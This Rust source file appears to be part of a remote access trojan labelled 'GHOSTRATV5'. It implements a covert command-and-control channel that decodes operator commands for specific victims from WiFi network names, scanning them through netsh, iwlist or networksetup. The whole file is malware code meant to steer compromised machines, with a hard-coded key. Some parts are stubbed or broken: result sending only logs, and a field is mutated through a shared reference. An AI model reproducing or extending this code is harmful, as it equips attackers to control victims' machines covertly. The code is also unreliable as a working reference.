//! WiFi Beacon C2 channel.
//!
//! Scans for WiFi beacons with a specific SSID prefix (e.g., "GHOST-*").
//! Commands are encoded in the SSID: "GHOST-<victim_id>-<cmd_type_hex>"
//! Results are encoded in beacon data fields.

use tracing::{debug, info, warn};

use crate::c2::{C2Channel, C2Error, Command};

/// WiFi Beacon C2 channel
pub struct WifiBeaconC2 {
    prefix: String,
    interval_secs: u64,
    available: bool,
}

impl WifiBeaconC2 {
    pub fn new(prefix: String, interval_secs: u64) -> Self {
        Self {
            prefix,
            interval_secs,
            available: true,
        }
    }

    /// Scan WiFi networks (platform-specific implementation)
    #[cfg(windows)]
    fn scan_wifi(&self) -> Result<Vec<WifiNetwork>, C2Error> {
        use std::process::Command;

        // Use netsh to scan WiFi networks on Windows
        let output = Command::new("netsh")
            .args(&["wlan", "show", "networks", "mode=bssid"])
            .output()
            .map_err(|e| C2Error::Io(e))?;

        let text = String::from_utf8_lossy(&output.stdout);
        let mut networks = Vec::new();

        for line in text.lines() {
            if line.contains(&self.prefix) {
                let ssid = line.trim().to_string();
                networks.push(WifiNetwork {
                    ssid,
                    signal_quality: 0, // parsed from line
                    bssid: String::new(),
                });
            }
        }

        Ok(networks)
    }

    #[cfg(target_os = "linux")]
    fn scan_wifi(&self) -> Result<Vec<WifiNetwork>, C2Error> {
        use std::process::Command;

        // Try using iwlist first, then fallback to /proc/net
        let output = Command::new("bash")
            .args(&["-c", "iwlist scan 2>/dev/null | grep ESSID || cat /proc/net/wireless"])
            .output()
            .map_err(|e| C2Error::Io(e))?;

        let text = String::from_utf8_lossy(&output.stdout);
        let mut networks = Vec::new();

        for line in text.lines() {
            if line.contains(&self.prefix) {
                let ssid = line.split('"').nth(1).unwrap_or("").to_string();
                if !ssid.is_empty() && ssid.starts_with(&self.prefix) {
                    networks.push(WifiNetwork {
                        ssid,
                        signal_quality: 0,
                        bssid: String::new(),
                    });
                }
            }
        }

        Ok(networks)
    }

    #[cfg(target_os = "macos")]
    fn scan_wifi(&self) -> Result<Vec<WifiNetwork>, C2Error> {
        use std::process::Command;

        // Use airport utility on macOS
        let output = Command::new("bash")
            .args(&["-c", "networksetup -getairportnetwork en0 2>/dev/null || scutil --nwi"])
            .output()
            .map_err(|e| C2Error::Io(e))?;

        let text = String::from_utf8_lossy(&output.stdout);
        let mut networks = Vec::new();

        for line in text.lines() {
            if line.contains(&self.prefix) {
                let ssid = line.split(' ').last().unwrap_or("").to_string();
                if !ssid.is_empty() && ssid.starts_with(&self.prefix) {
                    networks.push(WifiNetwork {
                        ssid,
                        signal_quality: 0,
                        bssid: String::new(),
                    });
                }
            }
        }

        Ok(networks)
    }

    /// Parse a command from a WiFi beacon SSID
    fn parse_beacon(ssid: &str, victim_id: &str) -> Option<Command> {
        // Format: "GHOST-<victim_id>-<cmd_type_hex>"
        if !ssid.starts_with(&format!("{}-", Self::prefix_static())) {
            return None;
        }

        let parts: Vec<&str> = ssid[Self::prefix_static().len()..].split('-').collect();
        if parts.len() < 2 {
            return None;
        }

        if parts[0] != victim_id {
            return None;
        }

        let cmd_type = u8::from_str_radix(parts[1].trim_start_matches("0x"), 16).ok()?;

        Some(Command {
            victim_id: victim_id.to_string(),
            cmd_type,
            data: Vec::new(),
            encrypted: false,
            crypto_key: "GHOSTRATV5".to_string(),
        })
    }

    fn prefix_static() -> &'static str {
        "GHOST"
    }
}

#[derive(Debug)]
struct WifiNetwork {
    ssid: String,
    signal_quality: i32,
    bssid: String,
}

#[async_trait::async_trait]
impl C2Channel for WifiBeaconC2 {
    fn name(&self) -> &str {
        "wifi-beacon"
    }

    async fn poll_commands(&self) -> Result<Vec<Command>, C2Error> {
        let mut commands = Vec::new();

        let networks = match self.scan_wifi() {
            Ok(n) => n,
            Err(e) => {
                debug!("WiFi scan failed: {}", e);
                self.available = false;
                return Ok(Vec::new());
            }
        };

        self.available = true;

        for network in networks {
            debug!("Found WiFi network: {}", network.ssid);

            // Parse victim_id from SSID: "GHOST-<victim_id>-<cmd_type>"
            let parts: Vec<&str> = network.ssid[self.prefix.len()..].split('-').collect();
            if parts.len() < 2 {
                continue;
            }

            let victim_id = parts[0];
            let cmd_type = u8::from_str_radix(parts[1].trim_start_matches("0x"), 16).unwrap_or(0);

            commands.push(Command {
                victim_id: victim_id.to_string(),
                cmd_type,
                data: Vec::new(),
                encrypted: false,
                crypto_key: "GHOSTRATV5".to_string(),
            });

            info!("WiFi beacon command: SSID={}, victim={}, cmd=0x{:02X}",
                network.ssid, victim_id, cmd_type);
        }

        Ok(commands)
    }

    async fn send_result(&self, _victim_id: &str, _result: &[u8]) -> Result<(), C2Error> {
        // WiFi Beacon C2: results are encoded in beacon probe responses
        // For now, just log — actual implementation would modify beacon frames
        debug!("WiFi Beacon result sent for {}", _victim_id);
        Ok(())
    }

    fn is_available(&self) -> bool {
        self.available
    }
}
